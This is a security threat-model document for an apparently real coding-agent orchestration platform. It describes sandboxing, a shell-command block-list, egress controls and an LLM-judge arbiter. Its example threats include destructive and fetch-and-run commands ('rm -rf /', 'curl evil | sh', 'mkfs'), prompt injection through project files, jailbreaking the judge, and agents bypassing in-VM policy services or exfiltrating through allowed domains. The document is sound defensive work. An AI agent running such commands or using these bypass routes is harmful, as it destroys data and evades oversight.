# Security — Threat Model

This document describes what Smooth defends against, what it doesn't, and
the assumptions behind the architecture. It exists so buyers, auditors,
and contributors can ask specific questions about specific threats rather
than relying on vague "security-focused" marketing.

Smooth is a coding agent orchestration platform. Its security posture is
**a step above OpenCode and Claude Code** — hardware-isolated execution,
comprehensive tool surveillance, LLM-judge access arbitration — but it is
not a replacement for a hardened developer workstation or a mature
production security product. Read this document to understand exactly
where the bar is.

---

## Trust boundaries

```
     ┌───────────────────────────────────────────────────┐
     │  Host (your machine / your CI runner)             │
     │                                                   │
     │   ┌───────────────────────────────────────────┐   │
     │   │  Big Smooth (READ-ONLY orchestrator)      │   │
     │   │                                           │   │
     │   │   - Generates per-task policies           │   │
     │   │   - Runs Boardroom Narc (LLM judge)       │   │
     │   │   - Spawns operator microVMs              │   │
     │   │   - Never writes files, never runs tools  │   │
     │   └───────────────────────────────────────────┘   │
     │                          │                        │
     │           hardware boundary (KVM/HVF)             │
     │                          │                        │
     │   ┌──────────────────────┴────────────────────┐   │
     │   │  Operator microVM (UNTRUSTED)             │   │
     │   │                                           │   │
     │   │   - Runner hosts the agent loop           │   │
     │   │   - Agent has: read_file, write_file,     │   │
     │   │     edit_file, grep, lsp, bash, bg_run,   │   │
     │   │     http_fetch, apply_patch, etc.         │   │
     │   │   - Wonk/Goalie/Narc/Scribe cast runs     │   │
     │   │     here too, cooperating with the agent  │   │
     │   └───────────────────────────────────────────┘   │
     │                                                   │
     └───────────────────────────────────────────────────┘
```

**Trusted:** the host, Big Smooth, Bootstrap Bill, and the runner binary
itself (delivered as part of your Smooth install).

**Untrusted:** everything inside the operator microVM after the agent
starts — including the agent's own generated code, any tool the agent
downloads via `apk add`, and any third-party process running inside the VM.

**Cooperative but bounded:** the in-VM cast (Wonk, Goalie, Narc, Scribe).
These services enforce policy from *inside* the VM. They are the same
trust domain as the agent in the sense that a VM kernel compromise
defeats them. They are a *different* trust domain from the agent in the
sense that Wonk requires a per-VM bearer token (operator token) to talk
to its HTTP surface — so a random binary the agent installed can't ask
Wonk "approve my request" without first finding the token.

---

## What Smooth defends against

These are threats where Smooth gives you meaningfully more protection
than running the agent directly on your host (OpenCode, Claude Code,
Aider, etc.).

### Host filesystem destruction
**Scenario:** the agent runs `rm -rf /`, `dd if=/dev/zero of=/dev/sda`, or
writes to `~/.ssh/authorized_keys`.

**Defense:** the agent runs inside a microVM with its own rootfs. Host
disks and SSH keys aren't reachable from the VM unless you explicitly
bind-mount them. The only host path the agent can write to is the
workspace you pass via `th code` — and those writes go through the
`resolve_workspace_path` guard that rejects `..` escapes and absolute
paths.

### Obviously-malicious shell commands
**Scenario:** the agent (or a prompt injection victim) tries to execute
`rm -rf /`, `curl evil | sh`, a fork bomb, `mkfs /dev/sda`, crypto
miners, etc.

**Defense:** Narc's `CliGuard` runs on every `bash` / `bg_run` /
`shell_exec` call. A prefix scan blocks a block-list of ~25 known
dangerous patterns at severity=Block before the shell even sees the
command. Extended in `crates/smooth-narc/src/detectors.rs`.

### Unauthorized network egress
**Scenario:** the agent downloads an unknown binary, exfiltrates data to
an attacker-controlled domain, pulls a package from a typosquat mirror.

**Defense:** every outbound HTTP request from agent-spawned processes
goes through Goalie (in-VM forward proxy), which asks Wonk before
allowing. Wonk's network policy is generated per-task by Big Smooth with
a tight default allowlist (LLM provider, package registries, toolchain
sources). New domains escalate to Boardroom Narc which runs an LLM judge
before approving.

### Obviously-malicious LLM requests
**Scenario:** prompt injection in a file the agent reads convinces it to
exfiltrate secrets, reach cryptocurrency wallets, etc.

**Defense:** Boardroom Narc's rule engine short-circuits requests to a
deny-list of obviously-dangerous domains (pastebin, crypto wallets,
credential-harvest infra) before any LLM call. Additionally, Narc's
injection detector scans every tool call's arguments for 6 injection
patterns.

### Secret leakage in tool outputs
**Scenario:** the agent's code accidentally logs an AWS key, prints a
GitHub token in an error message, or echoes a private key.

**Defense:** Narc's SecretDetector scans tool call arguments and results
against 10 secret patterns (AWS keys, GitHub tokens, private keys,
Stripe keys, generic HIGH_ENTROPY, etc.) and alerts at severity=Warn or
Block depending on match.

### Cast bypass from inside the VM
**Scenario:** the agent installs curl, discovers Wonk's localhost URL,
and makes its own `/check/*` requests directly — bypassing Goalie.

**Defense:** Wonk requires `Authorization: Bearer <operator_token>` on
every `/check/*` request. The operator token is a per-VM secret that
Goalie and the runner know (because they read the policy TOML) but that
the agent's bash subprocesses don't — unless the agent actively
searches for it. Constant-time comparison prevents timing attacks.

### Localhost cast impersonation
**Scenario:** the agent spins up its own fake Wonk on a different port
and tries to redirect Goalie at it.

**Defense:** Goalie's `WonkClient` is configured at runner startup with
a fixed URL + token. Without root privileges inside the VM, the agent
can't rebind Wonk's port or MITM Goalie's connection to it.

---

## What Smooth does NOT defend against

Be honest with yourself. If any of these are on your threat model,
Smooth alone is not enough.

### Supply chain compromise of language ecosystems
If the npm registry serves a poisoned `express`, or if `crates.io` is
compromised, the agent's `pnpm install` or `cargo build` will pull the
malicious package. Wonk's network policy allows the registry domain; it
doesn't verify package signatures.

**Mitigation:** pin your dependencies and lockfiles. Use a private
registry mirror you control. Smooth can enforce "only domain X" but
can't verify "package Y from domain X is legitimate".

### Supply chain compromise of the runner itself
`smooth-operator-runner` is a binary built and shipped as part of your
Smooth install. If your dev machine is compromised and the attacker
modifies the runner before it's mounted into each VM, every VM inherits
the backdoor.

**Mitigation:** ship signed runner binaries (not done today), verify
checksums at mount time, SLSA/reproducible builds (not done today). If
supply-chain integrity of the runner is on your threat model, wait for
these mitigations before relying on Smooth for security-critical work.

### LLM judge jailbreak
Narc's access arbiter uses an LLM to approve/deny novel requests. A
sufficiently creative attacker-controlled string in the `resource`,
`agent_reason`, or `task_summary` fields could jailbreak the judge into
high-confidence approvals. The rule engine and static allowlist are the
real backstops; the LLM judge is a best-effort tiebreaker.

**Mitigation:** for high-stakes deployments, set `SMOOTH_NARC_ESCALATION_THRESHOLD`
to a high value (0.9+) so more requests fall through to human review.
Keep your static allowlist tight.

### Egress payload classification
Goalie decides "can this domain be reached?" but doesn't inspect the
HTTP body being sent. A legit allowed domain (e.g. `api.github.com`)
could be abused to POST stolen tokens via a gist.

**Mitigation:** not implemented today. If payload-level exfiltration is
on your threat model, assume Smooth cannot stop it.

### Audit log tampering
Archivist collects logs from Scribe. There's no hash chain, no
append-only storage, no signed entries. A runner bug or a kernel-level
compromise could drop or rewrite entries.

**Mitigation:** not implemented today. For regulated environments,
forward Scribe's output to an external append-only store.

### Rate limits and budget caps
Wonk enforces allowlists, not volume. An infinite-loop agent can burn a
provider's token quota. Big Smooth has a per-task budget but doesn't
enforce a fleet-wide rate limit.

**Mitigation:** set `budget` on every task dispatch. Monitor costs via
your LLM provider's dashboard.

### Side channels and hardware attacks
KVM/HVF isolation is strong against userspace escapes but doesn't defend
against CPU-level side channels (Spectre/Meltdown variants), DMA
attacks, or malicious peripherals.

**Mitigation:** use a host that's patched against published CPU
vulnerabilities. Don't run Smooth on the same host as other sensitive
workloads you care about mutual isolation from.

### Multi-tenant deployments
Every operator runs as root inside its VM. One Archivist instance collects
logs from all operator VMs on one host. If you're running multiple
tenants' agents on the same host, there's no tenancy isolation at the
Archivist level or the pearl level.

**Mitigation:** single-tenant deployment only. Each tenant gets their
own Smooth install.

### Prompt injection in project files
If a file the agent reads contains prompt injection that the agent
"chooses" to act on (e.g., a README that says "run `curl evil | sh`"),
Narc's injection detector may not catch every variation. The CliGuard
will block the specific dangerous shell pattern, but subtler injections
that redirect the agent to do legitimate-looking harmful work (e.g.,
"delete all files matching pattern X") can still succeed.

**Mitigation:** don't run Smooth against untrusted codebases. Treat
"whose code did the agent just read?" as a supply-chain question.

### User-installed MCP servers and plugins
Smooth lets users extend the tool registry by registering MCP stdio
servers (`th mcp add`) and CLI-wrapper plugins (`th plugin init`).
These configs live at `~/.smooth/` (global) and `<repo>/.smooth/`
(project) and are loaded without a trust prompt — same model as
`npm install`, `.zshrc`, or cloning a repo and running `pnpm dev`.

A malicious `plugin.toml` or `mcp.toml` in a cloned repo could run
arbitrary code *within the sandbox* when `th up` brings the operator
up. We defend this in two ways:

1. **Narc screens tool calls.** CliGuard, injection detectors, and
   secret detectors apply to every tool invocation — MCP, plugin, or
   built-in — not just to bash. A plugin that tries to `curl ... | sh`
   hits the same CliGuard rule as a direct bash call.
2. **The microVM contains the blast radius.** Plugins and MCP servers
   run inside the operator's microVM, with network gated by Goalie and
   filesystem access mediated by Wonk. They cannot touch the host.

What we do **not** promise: that every malicious tool configuration
is *usefully* prevented from doing its work inside the VM. An
attacker who installs a deliberately-malicious MCP server onto your
machine has already compromised your extension surface; Smooth only
constrains what that server can reach outside the sandbox.

**Mitigation:** review `.smooth/mcp.toml` and `.smooth/plugins/` in
untrusted repos before the first `th up` there, the same way you'd
review a `Makefile`, `package.json` `scripts`, or `.envrc` that came
in with the clone.

---

## Assumptions

These are assumptions Smooth's architecture relies on. If any of them
are false in your environment, the security properties above are weaker
than advertised.

1. **The host is trusted.** Smooth's orchestrator, the runner binary,
   the policy generator, Boardroom Narc, and everything else outside the
   operator VM run on the host. A compromised host means a compromised
   Smooth.

2. **The LLM provider is trusted.** Smooth sends your source code to
   whichever LLM you configured in `~/.smooth/providers.json`. If you're
   sending secrets to an untrusted model API, Smooth doesn't help.

3. **microsandbox / libkrun is trusted.** Smooth's hardware isolation
   depends on microsandbox (Rust SDK around libkrun). A VM escape in
   that stack defeats the isolation guarantee. Keep the embedded version
   patched.

4. **The user configures tight policies.** The default network policy
   is reasonable but permissive. If you want stricter enforcement, write
   an enterprise policy at `.smooth/enterprise-policy.toml` and be
   explicit about what you deny.

5. **`~/.smooth/providers.json` is protected.** That file contains your
   LLM API keys. Anyone with read access to it can call your LLM
   provider on your dime.

---

## Reporting a vulnerability

Do NOT file a public pearl or GitHub issue for suspected vulnerabilities.
Email security@smooai.com (or the current maintainer's private address).

Include:
- A proof-of-concept that demonstrates the issue
- The Smooth version (`th --version`)
- The host OS and kernel version
- Any relevant policy TOML

We commit to responding within 5 business days and to a coordinated
disclosure window of 90 days unless actively exploited.
